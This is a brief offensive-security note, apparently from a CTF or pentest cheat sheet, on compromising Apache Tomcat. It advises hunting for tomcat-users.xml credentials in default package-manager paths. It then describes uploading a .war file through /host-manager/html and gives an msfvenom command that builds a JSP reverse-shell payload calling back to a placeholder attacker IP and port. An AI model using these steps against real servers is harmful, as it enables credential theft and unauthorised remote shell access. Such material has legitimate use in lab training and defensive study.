If you don't find a apache tomcat server and you don't find the desired files (typically `tomcat-users.xml`) Think about checking the default paths when you install it through a package manager. There you may find gold.

If you manage to reach `/host-manager/html` then you can try uploading a .war file to trigger a reverse shell.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war
```